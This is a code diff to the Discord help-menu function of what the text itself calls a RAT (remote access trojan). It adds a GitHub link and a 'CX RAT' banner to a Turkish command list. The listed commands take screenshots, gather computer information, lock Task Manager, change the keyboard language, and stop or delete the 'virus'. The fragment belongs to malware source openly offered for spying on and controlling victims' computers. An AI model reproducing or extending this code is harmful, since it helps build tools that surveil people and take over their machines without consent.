@@ -51,7 +51,9 @@ async def send_help_menu(destination):
     else:
       ascii_art = "---------------- KOMUTLAR --------------"
 
-    part1 = """!help / !yardim    = Bu Menüyü Gösterir
+    part1 = """https://github.com/CxMes/Cx-Discord-Rat/tree/main
+-------------------CX RAT--------------------------------
+!help / !yardim    = Bu Menüyü Gösterir
 !bilgi            = Bilgisayar Bilgilerini ve Aktif Pencereyi Gösterir
 !ss               = Ekran Görüntüsü Alır
 !otomatiks <a,ar> = Döngülü Ekran Görüntüsü Alır
@@ -110,7 +112,9 @@ async def send_help_menu(destination):
 !gorevyoneticisikapat = Görev Yöneticisini kilitler/açar
 !sistemdili       = Klavye dilini değiştirir
 !vdur             = Virüsü Durdurur
-!vsil             = Virüsü Siler"""
+!vsil             = Virüsü Siler
+https://github.com/CxMes/Cx-Discord-Rat/tree/main
+-------------------CX RAT--------------------------------"""
 
     await destination.send(f"```text\n{ascii_art}\n\n{part1}\n```")
     await destination.send(f"```text\n{part2}\n```")
